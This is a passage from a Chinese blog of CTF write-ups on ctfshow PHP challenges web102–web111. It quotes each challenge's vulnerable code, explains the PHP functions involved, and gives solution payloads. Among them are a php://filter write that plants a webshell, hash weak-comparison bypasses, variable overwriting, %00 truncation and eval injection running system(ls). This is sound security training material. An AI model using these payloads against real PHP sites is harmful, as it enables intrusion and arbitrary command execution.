<p>bin2hex()函数就是相反的了</p>
<p>注意，我们的 payload 是从 v2 第三位开始的，因此前面需要增加两个数字，绕过 substr 函数。 </p>
<p>最终的paylaod就是:</p>
<p>GET:v2&#x3D;11504438395948526859794171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php</p>
<p>POST:v1&#x3D;hex2bin</p>
<p>正常来说对于file_put_contents()的话应该是第一个参数是文件名第二个参数是文件内容，但因为这里对v2进行了相关的处理，导致我们需要对v2传入设立了，所以v3想写成文件名的话就需要我们利用伪协议去写文件名</p>
<p>所以这就是为什么v3传入伪协议的原因</p>
<p>我们正常传入三个参数后会有回显信息，页面上的编码就是我们传入的shell</p>
<p><img src="/./../image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241101204319309.png" alt="image-20241112160124152"></p>
<p>访问我们的木马，然后在源代码中就可以看到我们的flag了</p>
<h2 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*p.*h.*p.*/i&quot;</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sorry&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这道题比之前增加了验证</p>
<h3 id="preg-match中-的作用"><a href="#preg-match中-的作用" class="headerlink" title="preg_match中*&#x2F;的作用"></a>preg_match中*&#x2F;的作用</h3><ul>
<li><strong><code>.\*</code></strong>: 表示零个或多个任意字符（除了换行符）。<code>.*</code> 的含义是可以匹配任意字符的任意数量（包括零个字符）。</li>
</ul>
<p>代码中的意思就是如果php之间有其他分割的字符，都会被当作php进行处理</p>
<p>这道题其实和上一题是一样的，但需要注意的是写马的时候注意不要有php字符串，可以用php短标签去进行绕过一句话木马的php</p>
<p>，用通配符去匹配flag文件的php后缀，而我们的参数中只有v3是带有php的，但正则匹配不影响v3，所以正常做就可以了</p>
<h2 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="相关函数-2"><a href="#相关函数-2" class="headerlink" title="相关函数"></a>相关函数</h3><h4 id="sha1-函数"><a href="#sha1-函数" class="headerlink" title="sha1()函数"></a>sha1()函数</h4><p>在 PHP 中，<code>sha1()</code> 是一个用于计算字符串的 SHA-1 哈希值的函数</p>
<p>sha1()函数的基本语法</p>
<p><code>string sha1(string $str, bool $raw_output = false)</code></p>
<ul>
<li>**<code>$str</code>**：要哈希的字符串。</li>
<li>**<code>$raw_output</code>**：一个可选参数。如果设置为 <code>true</code>，则返回原始的二进制数据；如果为 <code>false</code>（默认值），则返回十六进制格式的字符串。</li>
</ul>
<p>举例子:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line"><span class="variable">$hash</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$hash</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出sha-1哈希值2aae6c35c94fcfb415dbe95f408b9ce91ee846ed</span></span><br></pre></td></tr></table></figure>

<p>这里没有设置第二个参数，默认为返回十六进制格式的哈希值</p>
<p>如果是二进制的话，那就设置一下sha1函数中第二个参数为true就可以了</p>
<p>只要v1和v2sha1哈希值相等就行了，严重怀疑这道题是拿来凑数的哈哈哈哈</p>
<h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><p><img src="/./../image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241112161937164.png" alt="image-20241112161937164"></p>
<h3 id="相关函数-3"><a href="#相关函数-3" class="headerlink" title="相关函数"></a>相关函数</h3><h4 id="foreach-函数"><a href="#foreach-函数" class="headerlink" title="foreach()函数"></a>foreach()函数</h4><p>在 PHP 中，<code>foreach</code> 是一个用于遍历数组的控制结构。</p>
<p>foreach的基本语法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="comment">// 对于每个数组元素执行的代码</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="a-b"><a href="#a-b" class="headerlink" title="$$a&#x3D;$$b"></a>$$a&#x3D;$$b</h4><p><code>$$key = $$value;</code> 是一个使用可变变量的表达式</p>
<p>首先我们应该先理解一下这个$$key&#x3D;$$value，存在两个<code>$</code>的等式，可以使用php的变量覆盖</p>
<p>可变变量在 PHP 中允许你通过一个变量的值来创建另一个变量。例如：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$foo</span> = <span class="string">&quot;bar&quot;</span>;  <span class="regexp">//</span> 这里定义了一个变量 <span class="variable">$foo</span>，值为 <span class="string">&quot;bar&quot;</span></span><br><span class="line">$<span class="variable">$foo</span> = <span class="string">&quot;baz&quot;</span>; <span class="regexp">//</span> 这里创建了一个新的变量 <span class="variable">$bar</span>，值为 <span class="string">&quot;baz&quot;</span></span><br></pre></td></tr></table></figure>

<p>在这个例子中，<code>$$foo</code>实际上是 <code>$bar</code>，所以执行后，<code>$bar</code> 的值将是 <code>&quot;baz&quot;</code>。</p>
<p>代码审计:</p>
<p><strong><code>foreach ($_GET as $key =&gt; $value)</code></strong>: 对 <code>$_GET</code> 数组进行遍历。,$key为数组中的键，而$value为值</p>
<p>第一个if语句要求key键中不能有error，例如我们get传参?error&#x3D;1则会i返回what are you doing</p>
<p>第二个if语句要求value值不能等于flag，不然就会执行die函数</p>
<p>解题</p>
<p>分析代码：尝试让<code>$suces</code>或者<code>$error</code>存放flag值，两个foreach语句后都里一个<code>$$key=$$value</code>，可以让参数名是suces或error，值传递flag，则<code>$$key</code>是<code>$suces</code>或<code>$error</code>，<code>$$value</code>是<code>$flag</code>。</p>
<p>因为get限制了key不能error，所以参数名为suces，由于post里value值不能是flag，所以用get传递。post的代码在get之后执行，可以让<code>$error</code>的值为<code>$suces</code>，这样三个变量都是flag值，那么后面的语句，无论判断结果如何，都会输出flag。</p>
<p>payload:</p>
<p>GET传入suces&#x3D;flag</p>
<p>POST传入error&#x3D;suces</p>
<p>这题妙就妙在通过 $flag 替换 $error，然后在倒数第二步 die($error) 的时候输出的就是 flag</p>
<h2 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>) &amp;&amp; <span class="variable">$v1</span>!=<span class="variable">$v2</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>104一样，但多了一个条件就是v1不能等于v2</p>
<p>解题:</p>
<p>令两个参数的sha1哈希值一样但不是同一个参数就可以了</p>
<p>paylaod</p>
<p>#法一<br>get  v2[]&#x3D;1<br>post v1[]&#x3D;2</p>
<p>#法二 sha1 碰撞#sha1加密后均为 0e 开头，弱比较会被字母截断成0<br>get v2&#x3D;10932435112<br>post v1&#x3D;aaroZmOk</p>
<p>其实跟常规的md5绕过差不多</p>
<h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">       <span class="title function_ invoke__">parse_str</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="title function_ invoke__">md5</span>(<span class="variable">$v3</span>))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="相关函数-4"><a href="#相关函数-4" class="headerlink" title="相关函数"></a>相关函数</h3><h4 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h4><p>在 PHP 中，<code>parse_str()</code> 是一个用于解析查询字符串并将其转换为变量数组的函数</p>
<p>parse_str()函数的基本语法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="keyword">string</span> <span class="variable">$string</span>, <span class="keyword">array</span> &amp;<span class="variable">$array</span> = <span class="literal">null</span>): <span class="keyword">void</span></span><br></pre></td></tr></table></figure>

<ul>
<li>**<code>$string</code>**：要解析的查询字符串。</li>
<li>**<code>$array</code>**（可选）：如果提供，则解析后的变量会被存储在这个数组中。否则，解析后的变量会直接导入到当前的符号表（即可以直接使用变量名）。</li>
</ul>
<p>解题:</p>
<p>这里需要让v2中flag等于v3的md5值，而v2来自于v1组成的数组，如果v1中没有flag，则v2数组flag的值为null，那我们如果给v3传入一个数组，md5后结果也为null</p>
<p>对本题而言</p>
<h3 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h3><p>我们只要满足v3的md5等于v2[flag]即可。可以传递给v3任意值，然后v1&#x3D;flag&#x3D;v3的md5值，具体传递的值根据v3确定，v3经过md5后弱等于v2，那么md5后0e开头即可让md5的结果为0，所以让v2的flag变量值为0。</p>
<p>payload:</p>
<p>GET传入v3&#x3D;QNKCDZO</p>
<p>POST传入v1&#x3D;flag&#x3D;0</p>
<h3 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h3><p>我们传入v3[]&#x3D;1，则md5($v3)就是null 这时候v1随便传,也可以满足<code>if($v2[&#39;flag&#39;]==md5($v3))</code></p>
<h2 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="相关函数-5"><a href="#相关函数-5" class="headerlink" title="相关函数"></a>相关函数</h3><h4 id="ereg函数"><a href="#ereg函数" class="headerlink" title="ereg函数"></a>ereg函数</h4><p>是PHP旧版本中用于正则表达式匹配的函数，跟preg_match函数作用是一样的,</p>
<h4 id="strrev-函数"><a href="#strrev-函数" class="headerlink" title="strrev()函数"></a>strrev()函数</h4><p><code>strrev</code>是PHP内置的字符串函数，用于将字符串进行反转。它接受一个字符串作为参数，并返回反转后的结果。</p>
<p>解题</p>
<h3 id="00截断绕过ereg函数"><a href="#00截断绕过ereg函数" class="headerlink" title="00截断绕过ereg函数"></a>00截断绕过ereg函数</h3><p> ereg函数存在NULL截断漏洞，可以绕过正则过滤，使用%00截断。</p>
<p>payload:c&#x3D;a%00778</p>
<h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>解题:</p>
<p>采用php的内置类进行解题</p>
<p>首先我们要了解到，这里的echo是把v1当成字符串进行输出，那可以想到当一个实例化对象被当作字符产输出的时候会触发什么方法，答案就是__string()魔术方法，那我们把带有这个方法的类列出来</p>
<p>CachingIterator::__toString()<br>DirectoryIterator::__toString<br>Error::__toString<br>Exception::__toString</p>
<p>根据这些类，我们可以通过触发tostring魔术方法进行命令执行</p>
<p>pyload:<br>?v1&#x3D; CachingIterator&amp;v2&#x3D;system(ls)<br>?v1&#x3D; DirectoryIterator&amp;v2&#x3D;system(ls)<br>?v1&#x3D; Error&amp;v2&#x3D;system(ls)<br>?v1&#x3D; Exception&amp;v2&#x3D;system(ls) </p>
<p>查看目录后直接cat到flag就可以了</p>
<h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看到这么多被过滤的字符也是瞬间昏头了哈哈哈，没关系，我们先用脚本把没被过滤的字符串输出出来</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">32</span>;<span class="variable">$i</span>&lt;<span class="number">127</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&quot;</span>,<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> <span class="comment">#没被过滤的字符:&lt; &gt; A B C D E F G H I J K L M N O P Q R S T U V W X Y Z ] a b c d e f g h i j k l m n o p q r s t u v w x y z | &#125; </span></span><br></pre></td></tr></table></figure>

<p>这里的话过滤了大部分字符，正常的手法都行不通了，那就试一下新方法</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filesystemiterator 遍历文件类</span><br><span class="line"><span class="function"><span class="title">getcwd</span><span class="params">()</span></span>函数 获取当前工作目录 返回当前工作目录</span><br></pre></td></tr></table></figure>

<h3 id="Filesystemiterator类遍历目录"><a href="#Filesystemiterator类遍历目录" class="headerlink" title="Filesystemiterator类遍历目录"></a>Filesystemiterator类遍历目录</h3><p><code>FilesystemIterator</code>类是PHP中用于遍历文件系统的一个迭代器类。它可以用于遍历指定目录下的文件和子目录。</p>
<h3 id="getcwd函数获取目录"><a href="#getcwd函数获取目录" class="headerlink" title="getcwd函数获取目录"></a>getcwd函数获取目录</h3><p><code>getcwd()</code>函数是PHP中的一个内置函数，用于获取当前工作目录的路径。</p>
<p>语法:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">getcwd</span>(<span class="keyword">void</span>**)</span><br></pre></td></tr></table></figure>

<p>具体用法:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$currentDir</span> = <span class="title function_ invoke__">getcwd</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;当前工作目录是：<span class="subst">$currentDir</span>&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>类<code>FilesystemIterator</code>可以用来遍历目录，需要一个路径参数<br>函数<code>getcwd</code>可以返回当前工作路径且不需要参数，由此可以构造payload<br>&#x2F;?v1&#x3D;FilesystemIterator&amp;v2&#x3D;getcwd</p>
<h2 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line"><span class="comment">//将v2的地址传给v1</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>); </span><br><span class="line"><span class="comment">//打印v1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>常规先看看过滤了哪些东西，这次能用的只有大小写字母和|和}符号了</p>
<p>解析代码</p>
<h3 id="eval-“-v1-v2-”"><a href="#eval-“-v1-v2-”" class="headerlink" title="eval(“$$v1 &#x3D; &amp;$$v2;”);"></a>eval(“$$v1 &#x3D; &amp;$$v2;”);</h3><ol>
<li><code>$$v1</code>是一个变量变量，它的值将由<code>$v1</code>的值决定。例如，如果<code>$v1</code>的值为 <code>&quot;x&quot;</code>，那么<code>$$v1</code>就等同于 <code>$x</code>。</li>
<li><code>&amp;</code> 是引用操作符，用于创建一个变量的引用。</li>
<li><code>$$v2</code>也是一个变量变量，它的值将由<code>$v2</code>的值决定。</li>
<li><code>$$v1 = &amp;$$v2;</code> 表示将<code>$$v2</code>的引用赋值给<code>$$v1</code>，即<code>$v1</code>成为<code>$v2</code>的引用。</li>
</ol>
<p>因为我们并不知道flag在哪，所以我们可以用PHP的$GLOBALS超全局变量</p>
<h3 id="GLOBALS超全局变量"><a href="#GLOBALS超全局变量" class="headerlink" title="$GLOBALS超全局变量"></a>$GLOBALS超全局变量</h3><p><code>$GLOBALS</code> 是一个在 PHP 中预定义的超全局变量，它是一个包含全局作用域中所有全局变量的关联数组。</p>
<p><code>$GLOBALS</code> 数组的键是全局变量的名称，值是对应全局变量的引用。通过 <code>$GLOBALS</code> 数组，可以在任何作用域中访问和操作全局变量，而不需要使用 <code>global</code> 关键字。</p>
<p>举个例子:</p>
